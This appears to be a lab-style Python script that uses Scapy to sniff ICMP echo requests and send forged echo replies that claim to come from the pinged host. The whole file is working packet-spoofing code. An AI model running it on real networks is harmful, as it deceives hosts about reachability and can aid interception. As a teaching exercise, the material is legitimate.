from scapy.all import sniff, IP, TCP, Raw, send, UDP, ICMP
import time

def spoof_pkt(pkt):
    if ICMP in pkt and pkt[ICMP].type == 8:  # ICMP Echo Request 
        print("Original packet:")
        print("Source IP:", pkt[IP].src)
        print("Destination IP:", pkt[IP].dst)

        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl, ttl=99) 
        icmp = ICMP(type = 0, id=pkt[ICMP].id, seq = pkt[ICMP].seq)
        data = pkt[Raw].load

        newpkt = ip/icmp/data

        print("Spoofed packet:")
        print("Source IP:", newpkt[IP].src)
        print("Destination IP:", newpkt[IP].dst)

        send(newpkt, verbose=0)


pkt = sniff(filter="icmp", prn=spoof_pkt,)